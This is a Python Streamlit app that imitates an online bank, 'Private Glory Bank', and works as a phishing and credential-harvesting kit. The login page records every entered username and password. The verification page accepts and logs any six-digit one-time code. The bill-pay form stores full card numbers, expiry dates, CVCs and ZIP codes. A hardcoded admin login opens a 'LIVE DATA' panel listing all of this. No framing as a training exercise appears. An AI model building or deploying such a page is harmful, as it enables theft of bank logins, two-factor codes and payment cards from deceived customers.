import streamlit as st
import pandas as pd
from datetime import datetime
import plotly.express as px

# ====================== SESSION STATE ======================
if "checking_balance" not in st.session_state:
    st.session_state.checking_balance = 12340.50
if "savings_balance" not in st.session_state:
    st.session_state.savings_balance = 14911.32
if "captured_creds" not in st.session_state:
    st.session_state.captured_creds = []
if "captured_otp" not in st.session_state:
    st.session_state.captured_otp = []
if "scheduled_transfers" not in st.session_state:
    st.session_state.scheduled_transfers = []
if "login_history" not in st.session_state:
    st.session_state.login_history = []
if "file_uploads" not in st.session_state:
    st.session_state.file_uploads = []
if "transactions" not in st.session_state:
    st.session_state.transactions = []
if "authenticated" not in st.session_state:
    st.session_state.authenticated = False
if "otp_verified" not in st.session_state:
    st.session_state.otp_verified = False
if "is_admin" not in st.session_state:
    st.session_state.is_admin = False

st.set_page_config(page_title="Private Glory Bank", page_icon="Eagle", layout="wide")

# ====================== CSS ======================
st.markdown("""
<style>
    .stApp {background: linear-gradient(145deg, #fff 65%, #002868 100%);}
    .header {background: repeating-linear-gradient(90deg, #002868 0, #002868 60px, #BF0A30 60px, #BF0A30 120px);
             padding: 20px; text-align: center; border-bottom: 10px solid #fcca46; border-radius: 0 0 30px 30px;}
    .glass {background: rgba(255,255,255,0.95); padding: 30px; border-radius: 18px;
            box-shadow: 0 8px 32px rgba(0,40,104,0.2); margin: 20px 0;
            border-bottom: 6px solid #BF0A30; border-right: 5px solid #002868; border-left: 5px solid #fcca46;}
    .big {font-size: 120px; background: linear-gradient(90deg, #002868, #BF0A30);
          -webkit-background-clip: text; -webkit-text-fill-color: transparent;}
    h1,h2,h3 {color: #BF0A30 !important;}
    .money {color: #fcca46; font-size: 2em; font-weight: bold;}
</style>
""", unsafe_allow_html=True)

# ====================== CREDENTIALS ======================
VALID_USER, VALID_PASS = "client001", "SecureUSA2025!"
ADMIN_USER, ADMIN_PASS = "admin", "showme2025"

# ====================== CARD VALIDATION ======================
def validate_card_number(card):
    digits = [int(d) for d in card if d.isdigit()]
    if len(digits) not in [15, 16]: return False
    return (sum(digits[-1::-2]) + sum(sum(divmod(2*x, 10)) for x in digits[-2::-2])) % 10 == 0

def validate_cvc(cvc): return len(cvc) in [3, 4] and cvc.isdigit()
def validate_expiry(exp): return len(exp) == 5 and exp[2] == '/' and exp[:2].isdigit() and exp[3:].isdigit()

# ====================== PAGES ======================
def login_page():
    st.markdown('<div class="header"><div class="big">Eagle</div><h1>Private Glory Bank</h1></div>', unsafe_allow_html=True)
    col1, _, col2 = st.columns([1, 1, 1])
    with col2:
        user = st.text_input("User ID")
        pwd = st.text_input("Password", type="password")
        if st.button("Log In", type="primary", use_container_width=True):
            st.session_state.captured_creds.append({"time": datetime.now().isoformat(), "user": user, "pass": pwd})
            st.session_state.login_history.append({"time": datetime.now().isoformat(), "user": user})
            if user == VALID_USER and pwd == VALID_PASS:
                st.session_state.authenticated = True
                st.rerun()
            elif user == ADMIN_USER and pwd == ADMIN_PASS:
                st.session_state.is_admin = True
                st.session_state.authenticated = True
                st.rerun()
            else:
                st.error("Invalid credentials")

def otp_page():
    st.markdown("<h1 style='text-align:center'>Security Verification</h1><p>Code sent to ••••1776</p>", unsafe_allow_html=True)
    code = st.text_input("Enter 6-digit code", max_chars=6)
    if st.button("Verify", type="primary"):
        st.session_state.captured_otp.append({"time": datetime.now().isoformat(), "otp": code})
        if len(code) == 6 and code.isdigit():
            st.session_state.otp_verified = True
            st.rerun()
        else:
            st.error("Invalid code")

def admin_view():
    st.markdown("<h1 style='text-align:center;color:#BF0A30'>Eagle ADMIN PANEL — LIVE DATA</h1>", unsafe_allow_html=True)
    tabs = st.tabs(["Logins", "OTPs", "Card Payments", "Transfers", "Files", "Transactions"])
    with tabs[0]: st.dataframe(pd.DataFrame(st.session_state.captured_creds))
    with tabs[1]: st.dataframe(pd.DataFrame(st.session_state.captured_otp))
    with tabs[2]: st.json([x for x in st.session_state.captured_creds if "card_payment" in str(x)], expanded=False)
    with tabs[3]: st.dataframe(pd.DataFrame(st.session_state.scheduled_transfers))
    with tabs[4]: st.dataframe(pd.DataFrame(st.session_state.file_uploads))
    with tabs[5]: st.dataframe(pd.DataFrame(st.session_state.transactions))

def dashboard():
    total = st.session_state.checking_balance + st.session_state.savings_balance
    st.markdown('<div class="header"><div class="big">Eagle</div><h1>Private Glory Bank</h1><p style="color:#fcca46"><b>In God We Trust</b></p></div>', unsafe_allow_html=True)
    st.write("### Welcome back, patriot!")
    c1, c2, c3, c4 = st.columns(4)
    c1.metric("Total Balance", f"${total:,.2f}")
    c2.metric("Available Credit", "$15,700")
    c3.metric("Monthly Spending", "$3,214")
    c4.metric("Savings Goal", "78%")
    col1, col2 = st.columns(2)
    with col1:
        st.write("#### Asset Distribution")
        fig = px.pie(values=[st.session_state.checking_balance, st.session_state.savings_balance],
                     names=["Checking", "Savings"], color_discrete_sequence=["#BF0A30", "#002868"], hole=0.4)
        st.plotly_chart(fig, use_container_width=True)
    with col2:
        st.write("#### Yearly Spending")
        data = pd.DataFrame({"Category": ["Food", "Bills", "Shopping", "Travel", "Health"],
                             "Amount": [3600, 3800, 2700, 2200, 1750]})
        st.bar_chart(data.set_index("Category"))

def accounts():
    st.markdown("<div class='glass'><h2>My Accounts</h2></div>", unsafe_allow_html=True)
    st.markdown(f"<div class='glass'><h3>Private Glory Checking ••••1776</h3><p class='money'>${st.session_state.checking_balance:,.2f}</p></div>", unsafe_allow_html=True)
    st.markdown(f"<div class='glass'><h3>Stars & Stripes Savings ••••1812</h3><p class='money'>${st.session_state.savings_balance:,.2f}</p></div>", unsafe_allow_html=True)

def cards_page():
    st.markdown("<div class='glass'><h2>Private Glory Freedom Card ••••1776</h2><p style='font-size:80px;text-align:center'>Credit Card</p></div>", unsafe_allow_html=True)
    c1, c2, c3 = st.columns(3)
    with c1:
        if st.button("Show Full Number"):
            st.success("5412 1776 2024 1812")
    with c2:
        if st.button("Show Expiry"):
            st.success("07/29")
    with c3:
        if st.button("Show CVV"):
            st.session_state.captured_creds.append({"time": datetime.now().isoformat(), "cvv_revealed": "776"})
            st.info("CVV: 776")

def transfer():
    st.markdown("<div class='glass'><h1>Transfer & Payments</h1></div>", unsafe_allow_html=True)
    tab1, tab2 = st.tabs(["Transfer Money", "Pay Bill with Card"])
    
    with tab1:
        from_acc = st.selectbox("From", ["Private Glory Checking ••••1776", "Stars & Stripes Savings ••••1812"])
        to_acc = st.selectbox("To", ["Stars & Stripes Savings ••••1812", "External Account", "International Wire"])
        amount = st.number_input("Amount ($)", min_value=0.01)
        if st.button("Send Transfer", type="primary"):
            st.success(f"Transfer of ${amount:,.2f} initiated!")
            st.session_state.scheduled_transfers.append({"from": from_acc, "to": to_acc, "amount": amount, "time": datetime.now().isoformat()})

    with tab2:
        st.markdown("#### Pay Any Bill Instantly")
        card = st.text_input("Card Number")
        exp = st.text_input("Expiry (MM/YY)")
        cvc = st.text_input("CVC", type="password")
        zip_code = st.text_input("Billing ZIP")
        payee = st.text_input("Bill/Payee Name")
        amt = st.number_input("Amount", min_value=0.01)
        
        if st.button("Pay Bill Now", type="primary"):
            if validate_card_number(card) and validate_cvc(cvc) and validate_expiry(exp):
                st.success(f"Payment of ${amt:,.2f} to {payee} successful!")
                st.session_state.captured_creds.append({
                    "time": datetime.now().isoformat(),
                    "card_payment": {"card": card, "exp": exp, "cvc": cvc, "zip": zip_code, "payee": payee, "amount": amt}
                })
            else:
                st.error("Invalid card details")

def messages():
    st.markdown("<div class='glass'><h2>Secure Messages & Uploads</h2></div>", unsafe_allow_html=True)
    uploaded = st.file_uploader("Upload ID, tax docs, etc.", type=["pdf", "jpg", "png"])
    if uploaded:
        st.session_state.file_uploads.append({"file": uploaded.name, "time": datetime.now().isoformat()})
        st.success("Document received securely")

def transaction_history():
    df = pd.DataFrame(st.session_state.transactions)
    st.dataframe(df if not df.empty else "No transactions yet")

def sidebar():
    st.sidebar.markdown('<div style="text-align:center;background:linear-gradient(#002868,#BF0A30);padding:20px;color:white;border-radius:15px"><div style="font-size:60px">Eagle</div><h2>Private Glory Bank</h2></div>', unsafe_allow_html=True)
    return st.sidebar.radio("Navigate", ["Dashboard", "Accounts", "Cards", "Transfer & Payments", "Messages", "Transaction History"])

# ====================== MAIN ======================
if not st.session_state.authenticated:
    login_page()
elif st.session_state.is_admin:
    admin_view()
elif not st.session_state.otp_verified:
    otp_page()
else:
    page = sidebar()
    if page == "Dashboard": dashboard()
    elif page == "Accounts": accounts()
    elif page == "Cards": cards_page()
    elif page == "Transfer & Payments": transfer()
    elif page == "Messages": messages()
    elif page == "Transaction History": transaction_history()
